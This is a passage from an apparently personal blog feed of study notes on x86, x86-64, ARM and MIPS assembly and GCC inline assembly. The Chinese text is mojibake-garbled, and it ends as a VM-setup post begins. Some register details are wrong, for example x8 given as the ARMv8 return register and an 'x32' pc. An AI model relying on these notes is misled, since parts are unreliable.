<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; åŸºæœ¬è¿ç®—</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; é€»è¾‘è¿ç®—</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; ç§»ä½æ“ä½œ</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left ç®—æ•°å·¦ç§»</span><br><span class="line">sar</span><br></pre></td></tr></table></figure>

<p>è·³è½¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; jmp ç±»</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call function</span><br><span class="line">; call æ‰§è¡Œæ—¶ï¼Œä¿å­˜ eip+4, å¹¶è·³è½¬åˆ°å¯¹åº”åœ°å€</span><br><span class="line">; å‚æ•°ä¼ é€’ï¼Œä½¿ç”¨æ ˆä¼ é€’å‚æ•°</span><br></pre></td></tr></table></figure>

<p>æ ˆå¸§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; åœ¨è°ƒç”¨å­ç¨‹åºæ—¶ï¼Œä¼šå¼€è¾Ÿå­ç¨‹åºçš„æ ˆå¸§ã€‚espå’Œebpä¿å­˜æ ˆé¡¶å’Œæ ˆåº•</span><br><span class="line">; åœ¨è¿”å›çˆ¶ç¨‹åºéœ€è¦è¿˜åŸesp, ebpæŒ‡é’ˆã€‚</span><br><span class="line">; æ ˆ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ç³»ç»Ÿä¸­æ–­å¤„ç†syscall</span><br><span class="line">int 0x80            ; eaxç³»ç»Ÿè°ƒç”¨å· ebx, ecx, edxå¯¹åº”å‡½æ•°å‰ä¸‰ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure>


<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>å®é™…ä¸Šx86-64ä¸AMD64åŸºæœ¬æ˜¯åŒä¸€ä¸ªISAï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨è´­ä¹°çš„Intelæˆ–è€…AMDç”Ÿäº§çš„CPUï¼Œéƒ½å±äºx86-64çš„ISAã€‚</p>
<p>x86-64: 64ä½ï¼Œå¯å¯»å€ <code>2^64</code>, å…¼å®¹x86</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 32ä½ r-&gt;bæ¯”å¦‚ rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32ä½ å¯„å­˜å™¨ï¼Œä½32ä½</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure>


<p>Linuxä¸‹å‡½æ•°è°ƒç”¨çº¦å®š, ä¸x86ç›¸å·®è¾ƒå¤§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; å‡½æ•°å‚æ•°</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; ä¼ é€’å‰6ä¸ªå‚æ•°ï¼Œç¬¬7ä¸ªå‚æ•°å¼€å§‹å’Œx86ä¸€æ ·ä½¿ç”¨æ ˆä¼ é€’</span><br><span class="line"></span><br><span class="line">; è¿”å›å€¼</span><br><span class="line">rax</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">; å‚æ•°ä¼ é€’ä¸å‡½æ•°ä¸€è‡´ï¼Œ rdi, rsi...</span><br></pre></td></tr></table></figure>

<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p>RISC</p>
<p>ARMæŒ‡ä»¤æ ¼å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ æ›´åŠ å­¦æœ¯ rd: destination; rn: å¯„å­˜å™¨ä¸­ç”¨äºç®—æœ¯è¿ç®—çš„æ“ä½œæ•°; shifter_operand: æ•°æ®å¤„ç†æŒ‡ä»¤</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ æ³¨é‡Š  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure>

<h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><p>32ä½æŒ‡ä»¤é›†<code>A32</code>ï¼Œå…¼å®¹16ä½æŒ‡ä»¤é›†<code>T16</code></p>
<ul>
<li>ç”±äºARMv7 å…¼å®¹ <code>ARM</code>å’Œ <code>Thumb</code>æŒ‡ä»¤é›†ï¼ŒåŒºåˆ†ä¸¤ä¸ªæŒ‡ä»¤é›†ï¼š <code>addr &amp; 1 == 1</code>ä»£è¡¨<code>thumb</code>æŒ‡ä»¤é›†</li>
</ul>
<p>ARMv7é€šç”¨å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r0-r3: args, å‡½æ•°å‰å››ä¸ªå‚æ•°ï¼Œè¿”å›å€¼ä¹Ÿä¼šå­˜å…¥r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, åœ¨æ–°ç‰ˆæœ¬å½“ä½œé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ï¼Œä¼šåœ¨blæ—¶å¼•å‘bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, æŒ‡å‘ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure>

<p>æ ‡å¿—ä½(CPSR: program status reg),å¦‚æœæƒ³æ”¹å˜ï¼Œéœ€è¦åœ¨æŸäº›æŒ‡ä»¤ååŠ  <code>s</code> (sub -&gt; subs)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N: negative, è¿ç®—ç»“æœ&gt;=0 N=0, è´Ÿæ•°ï¼ŒN=1</span><br><span class="line">Z: zero, ä¸º0</span><br><span class="line">C: carry, è¿›ä½</span><br><span class="line">V: overflow æœ‰æº¢å‡º</span><br><span class="line"></span><br><span class="line">; cmp å¯ä»¥æ”¹å˜</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure>

<p>mov ç«‹å³æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ ç‰¹æ®Šå¯„å­˜å™¨ cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å†…å­˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ ä¸èƒ½ç›´æ¥åƒintel movè®¿é—®å†…å­˜, ä½¿ç”¨ load, storeå‘½ä»¤é—´æ¥è®¿é—®å†…å­˜</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; ä¾‹å­</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002ï¼ŒåŠ è½½åœ°å€åˆ°å¯„å­˜å™¨ </span><br><span class="line">str r1, [r0]         @ r1 ä¸­çš„å€¼å†™å…¥åˆ° r0 ä¸­æ‰€ä¿å­˜çš„åœ°å€ä¸­</span><br></pre></td></tr></table></figure>

<p>ç®—æœ¯æŒ‡ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ åŸºæœ¬ç®—æ•°è¿ç®—</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ æƒ³æ”¹å˜æ ‡å¿—ä½, åŠ  &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ é€»è¾‘è¿ç®—</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ ç§»ä½æ“ä½œ</span><br><span class="line">lsl   @ logic shift left é€»è¾‘å·¦ç§»</span><br><span class="line">lsr   @ é€»è¾‘å³ç§»</span><br><span class="line">asr   @ arithmetic shift right ç®—æ•°å³ç§»</span><br><span class="line">ror   @ rotate right å¾ªç¯å³ç§»</span><br></pre></td></tr></table></figure>


<p>ç¨‹åºè·³è½¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b: ç›´æ¥è·³åˆ°labelã€‚ branch</span><br><span class="line">bx: è·³è½¬+çŠ¶æ€åˆ‡æ¢    @ ARM/Thumb æ¨¡å¼(ä½¿ç”¨ä¸€æ¬¡ï¼Œåˆ‡æ¢ä¸€æ¬¡)</span><br><span class="line">bl: b + link, é¦–å…ˆä¿å­˜ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€åˆ°lr, ç„¶åæ”¹å˜pcã€‚</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ æ¡ä»¶è·³è½¬, çŠ¶æ€å¯„å­˜å™¨</span><br><span class="line">eq: equal ç›¸ç­‰</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°è°ƒç”¨ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ ä»ç„¶æ˜¯ä½¿ç”¨ `b` æŒ‡ä»¤è°ƒç”¨å‡½æ•°</span><br></pre></td></tr></table></figure>

<p>æ ˆå¸§ç›¸å…³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ sp, fp ç»´æŠ¤æ ˆå¸§çš„çŠ¶æ€, æ ˆå‘ ä½åœ°å€ç”Ÿé•¿</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop å¯ä»¥æ“ä½œå¤šä¸ªå¯„å­˜å™¨ï¼Œç”šè‡³å¯ä»¥æ§åˆ¶pc; spè‡ªåŠ¨å˜åŒ–</span><br><span class="line">@ ä¸‹é¢æ˜¯å¸¸è§çš„å‡½æ•°è°ƒç”¨å‡ºç°å‡ºç°çš„gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ é¡ºåºæ˜¯ push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ é¡ºåºæ˜¯  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº push, å…ˆè®¡ç®—spçš„å€¼?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ ç­‰ä»·äº pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿä¸­æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ é€šè¿‡vector_swi/svc è·å¾—ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI å½¢å¼</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI å½¢å¼ï¼Œç«‹å³æ•° immè¢«å¿½ç•¥,ç”±r0å†³å®š</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure>

<h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><p>ä¸ <code>armv7</code> å­˜åœ¨ä¸€å®šçš„åŒºåˆ«</p>
<p>64ä½æŒ‡ä»¤é›† <code>aarch64</code>, å…¼å®¹32ä½ <code>aarch32</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction setï¼›</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure>

<p>ARMv8 é€šç”¨å¯„å­˜å™¨</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-x7: å‡½æ•°å‰<span class="number">8</span>ä¸ªå‚æ•°å€¼</span><br><span class="line"><span class="symbol">x8:</span> å‡½æ•°è¿”å›å€¼</span><br><span class="line"><span class="symbol">x19</span>-x28: æ²¡ç‰¹æ®Šç”¨é€” </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, æ’<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, ä¸èƒ½åƒarmv7ä¸€æ ·è¢«ä¿®æ”¹</span><br><span class="line"></span><br><span class="line"><span class="comment">@ ä¹Ÿå¯ä½¿ç”¨32ä½çš„ w0...å¯„å­˜å™¨, å¯æ‰©å±•ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ spå¯¹åº”çš„ç‰©ç†å¯„å­˜å™¨æœ‰å¦‚ä¸‹å››ä¸ª(æŸä¸€æ—¶åˆ»åªèƒ½å¯¹åº”ä¸‹é¢å…¶ä¸­ä¸€ä¸ª)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>å’ŒSP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure>

<p>SPSR æ›¿ä»£äº† CPSR</p>
<p>å†…å­˜è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ load &amp; store, å…¼å®¹armv7 ldr</span><br><span class="line">ldp  @ load pair ä¸€å¯¹ã€‚</span><br><span class="line">	ldp x8, x2, [x0, #0x10]   @ å°†x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ å‚æ•°ä¼ é€’</span><br><span class="line">x0-x7: å‡½æ•°å‰8ä¸ªå‚æ•°å€¼</span><br><span class="line">x8: å‡½æ•°è¿”å›å€¼</span><br><span class="line"></span><br><span class="line">@ aarch64æ²¡æœ‰pushå’Œpop æŒ‡ä»¤</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ supervisor call</span><br><span class="line">svc #imm</span><br></pre></td></tr></table></figure>

<p>TrustZone ç›¸å…³</p>
<h3 id="ARMv9"><a href="#ARMv9" class="headerlink" title="ARMv9"></a>ARMv9</h3><p>xxx</p>
<h2 id="Mips"><a href="#Mips" class="headerlink" title="Mips"></a>Mips</h2><p>RISCï¼Œ <code>Microprocessor without Interlocked Pipeline Stages</code></p>
<p><code>mips</code> æ˜¯<code>big-endian</code>, mipselæ˜¯ <code>little-endian</code></p>
<p>æ ¼å¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ ¹æ®ä½æ•°</span><br><span class="line">31-26   25-21 20-16 15-11  10-6  5-0</span><br><span class="line">op-code   rs    rt   rd    shamt func</span><br><span class="line"></span><br><span class="line"># æ³¨é‡Šä½¿ç”¨ `#`</span><br><span class="line"></span><br><span class="line">rd: register destination</span><br><span class="line">rt: target</span><br><span class="line">rs: source</span><br></pre></td></tr></table></figure>

<p>é€šç”¨å¯„å­˜å™¨ï¼Œ 32ä¸ª</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">$<span class="number">0</span>-$<span class="number">31</span>          <span class="comment"># æœ‰å„è‡ªçš„åŠ©è®°ç¬¦ï¼Œçœ‹æ±‡ç¼–æ—¶å¤šä½¿ç”¨åŠ©è®°ç¬¦</span></span><br><span class="line"><span class="symbol">$0:</span>    $<span class="built_in">zero</span>    <span class="comment"># æ’0</span></span><br><span class="line"><span class="number">1</span>:     $<span class="built_in">at</span>      # </span><br><span class="line"><span class="number">2</span><span class="number">-3</span>:   $<span class="built_in">v0</span>-<span class="built_in">v1</span>   <span class="comment"># value å‡½æ•°è¿”å›å€¼</span></span><br><span class="line"><span class="number">4</span><span class="number">-7</span>:   $<span class="built_in">a0</span>-<span class="built_in">a3</span>   <span class="comment"># arg  å‡½æ•°å‚æ•°</span></span><br><span class="line"><span class="number">8</span><span class="number">-15</span>:  $<span class="built_in">t0</span>-<span class="built_in">t7</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-23</span>: $<span class="built_in">s0</span>-<span class="built_in">s7</span>   <span class="comment"># save ä¿ç•™</span></span><br><span class="line"><span class="number">24</span><span class="number">-25</span>: $<span class="built_in">t8</span>-<span class="built_in">t9</span>   <span class="comment"># temp</span></span><br><span class="line"><span class="number">16</span><span class="number">-27</span>: $<span class="built_in">k0</span>-<span class="built_in">k1</span>   <span class="comment"># å¼‚å¸¸æˆ–ä¸­æ–­</span></span><br><span class="line"><span class="number">28</span>:    $<span class="built_in">gp</span>      <span class="comment"># global pointer</span></span><br><span class="line"><span class="number">29</span>:    $<span class="built_in">sp</span>      <span class="comment"># stack pointer</span></span><br><span class="line"><span class="number">30</span>:    $<span class="built_in">fp</span>, <span class="built_in">s8</span>  <span class="comment"># frame pointer </span></span><br><span class="line"><span class="number">31</span>:    $<span class="built_in">ra</span>      <span class="comment"># ret addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; ç‰¹æ®Š</span></span><br><span class="line"><span class="symbol">pc:</span> program cunter</span><br></pre></td></tr></table></figure>

<p>æŒ‡ä»¤æ ¼å¼</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">r: register format <span class="comment"># ä½¿ç”¨å¯„å­˜å™¨</span></span><br><span class="line">i: immediate       <span class="comment"># ä½¿ç”¨ç«‹å³æ•°</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jump</span></span><br></pre></td></tr></table></figure>

<p>å¯»å€</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="keyword">move </span>$<span class="built_in">a0</span>, $<span class="built_in">zero</span>    <span class="comment"># a0&lt;-0</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®å†…å­˜</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»ç„¶ load, store</span></span><br><span class="line"><span class="comment"># b: byte; w: word; h: half word; ...</span></span><br><span class="line"><span class="keyword">sw: </span><span class="keyword">sw </span>$<span class="built_in">ra</span>, <span class="number">0x38</span>($<span class="built_in">sp</span>)   <span class="comment"># å°†$raå­˜å…¥æ ˆä¸­ $sp+38çš„åœ°æ–¹</span></span><br><span class="line"><span class="keyword">sb: </span>...</span><br><span class="line"><span class="keyword">lw: </span>...</span><br><span class="line"><span class="keyword">lb: </span>...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¾‹å­</span></span><br><span class="line"><span class="keyword">sb </span>r1, <span class="number">0</span>(R2)</span><br><span class="line"><span class="keyword">lb </span>r1, <span class="number">0</span>(r2)</span><br></pre></td></tr></table></figure>

<p>ç®—æœ¯</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; åŸºæœ¬ç®—æœ¯</span></span><br><span class="line"><span class="keyword">add</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sub</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; é€»è¾‘</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">xor</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">nor</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment">; ç§»ä½</span></span><br><span class="line"><span class="keyword">sll</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">srl</span></span><br></pre></td></tr></table></figure>

<p>è·³è½¬</p>
<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line"><span class="comment">; jmp</span></span><br><span class="line"><span class="keyword">j: </span><span class="keyword">jmp </span>label</span><br><span class="line"><span class="keyword">jr: </span>ç”¨æ³• <span class="keyword">jr </span>$<span class="built_in">ra</span> ç­‰</span><br><span class="line"><span class="keyword">jal: </span><span class="keyword">jmp </span><span class="keyword">and </span>link, ä¿å­˜ ret <span class="keyword">addr(pc+4) </span>åˆ° $<span class="built_in">ra</span></span><br><span class="line"><span class="keyword">jalr: </span>å€Ÿç”¨å¯„å­˜å™¨è·³è½¬ï¼Œé“¾æ¥ï¼Œå¸¸ç”¨</span><br><span class="line"></span><br><span class="line"><span class="comment">; branch, åé¢éœ€è¦è·Ÿæ“ä½œ</span></span><br><span class="line"><span class="keyword">beq: </span><span class="keyword">beq </span>$s, $t, offset   <span class="comment"># $s=$tè·³è½¬</span></span><br><span class="line"><span class="keyword">bne: </span><span class="keyword">b </span>not eq</span><br><span class="line"><span class="keyword">bltz: </span><span class="keyword">branch </span>less than <span class="built_in">zero</span></span><br></pre></td></tr></table></figure>

<p>æ¶æ„ç¼“å­˜</p>
<ul>
<li>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„cache: æŒ‡ä»¤ å’Œ æ•°æ®</li>
</ul>
<h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><p>xxx</p>
<h2 id="GCC-Inline-Assembly"><a href="#GCC-Inline-Assembly" class="headerlink" title="GCC Inline Assembly"></a>GCC Inline Assembly</h2><p>å†…è”æ±‡ç¼–ï¼Œæˆ‘çš„ç†è§£æ˜¯ç›´æ¥å†™ æ±‡ç¼–è¯­å¥å°±è¡Œ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;mov $1, %eax&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æ‰©å±•å†…é“¾æ±‡ç¼–ï¼Œæœ‰ç‚¹ä¸åŒ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> ( assembler <span class="keyword">template</span>  </span><br><span class="line">		: output operands                   <span class="comment">/* optional è¾“å‡º */</span>  </span><br><span class="line">		: input operands                    <span class="comment">/* optional è¾“å…¥*/</span>  </span><br><span class="line">		: list of clobbered registers       <span class="comment">/* optional é€šçŸ¥ç¼–è¯‘å™¨å¯èƒ½é€ æˆå¯„å­˜å™¨æˆ–å†…å­˜æ•°æ®ç ´åï¼Œæå‰ä¿æŠ¤*/</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<p>æŸäº›è§„åˆ™ï¼Œä¸»è¦</p>
<ul>
<li>r: register</li>
<li>m:memory</li>
<li>å¸¸ç”¨å¯„å­˜å™¨</li>
</ul>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">a rax/eax/ax/al</span><br><span class="line">b rbx</span><br><span class="line">c rcx</span><br><span class="line">d rdx</span><br><span class="line">S rsi</span><br><span class="line">D rdi</span><br><span class="line">I å¸¸æ•°å€¼</span><br><span class="line">q,r åŠ¨æ€åˆ†é…çš„å¯„å­˜å™¨</span><br><span class="line">g eax,ebx,ecx,edxæˆ–å†…å­˜å˜é‡</span><br><span class="line">A æŠŠeaxå’Œedxåˆæˆä¸€ä¸ª64ä½çš„å¯„å­˜å™¨(use long longs)</span><br></pre></td></tr></table></figure>

<ol>
<li>ä½¿ç”¨ q æŒ‡ç¤ºç¼–è¯‘å™¨ä» eax, ebx, ecx, edx åˆ†é…å¯„å­˜å™¨ã€‚ ä½¿ç”¨ r æŒ‡ç¤ºç¼–è¯‘å™¨ä» eax, ebx, ecx, edx, esi, edi åˆ†é…å¯„å­˜å™¨ã€‚</li>
<li>ä¸å¿…æŠŠç¼–è¯‘å™¨åˆ†é…çš„å¯„å­˜å™¨æ”¾å…¥æ”¹å˜çš„å¯„å­˜å™¨åˆ—è¡¨ï¼Œå› ä¸ºå¯„å­˜å™¨å·²ç»è®°ä½äº†å®ƒä»¬ã€‚</li>
<li><code>&quot;=&quot;</code> æ˜¯æ ‡ç¤ºè¾“å‡ºå¯„å­˜å™¨ï¼Œ<strong>å¿…é¡»è¿™æ ·ç”¨</strong>ã€‚</li>
<li>æ•°å­— <code>%n</code> çš„ç”¨æ³•ï¼šæ•°å­—è¡¨ç¤ºçš„å¯„å­˜å™¨æ˜¯æŒ‰ç…§å‡ºç°å’Œä»å·¦åˆ°å³çš„é¡ºåºæ˜ å°„åˆ°ç”¨â€râ€æˆ–â€qâ€è¯·æ±‚çš„å¯„å­˜å™¨ï¼å¦‚æœè¦é‡ç”¨â€râ€æˆ–â€qâ€è¯·æ±‚çš„å¯„å­˜å™¨çš„è¯ï¼Œå°±å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚</li>
</ol>
<p>ä¾‹å­ 1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (</span><br><span class="line">	<span class="string">&quot;cld/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;rep/n/t&quot;</span>  </span><br><span class="line">	<span class="string">&quot;stosl&quot;</span>  </span><br><span class="line">	: <span class="comment">/* no output registers */</span>  </span><br><span class="line">	: <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)  </span><br><span class="line">	: <span class="string">&quot;%edi&quot;</span> </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// intel æ ¼å¼ï¼šcount ç­‰éƒ½æ˜¯å˜é‡</span></span><br><span class="line">push edi</span><br><span class="line">mov ecx, count</span><br><span class="line">mov eax, fill_value</span><br><span class="line">mov edi, dest</span><br><span class="line">cld</span><br><span class="line">rep</span><br><span class="line">stosl</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­2ï¼šåŠ å…¥æ•°å­—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ (</span><br><span class="line">	<span class="string">&quot;push %%rax&quot;</span></span><br><span class="line">	<span class="string">&quot;pop %0&quot;</span></span><br><span class="line">	: <span class="string">&quot;=m&quot;</span>(var)</span><br><span class="line">	: <span class="string">&quot;c&quot;</span>(count)</span><br><span class="line">	: memory</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://learningos.cn/ucore_os_webdocs/lab0/lab0_2_3_1_3_gcc_inline_asm.html">GCC åŸºæœ¬å†…è”æ±‡ç¼– Â· GitBook (learningos.cn)</a></p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>è™šæ‹Ÿæœºé…ç½®</title>
    <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<blockquote>
<p>ä¸ªäººå¸¸ç”¨è™šæ‹Ÿæœºé…ç½®ï¼ŒæŒç»­æ›´æ–°ã€‚ã€‚ã€‚</p>
</blockquote>
<span id="more"></span>

<h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><p>ä¸‹è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<p>æ’ä»¶</p>
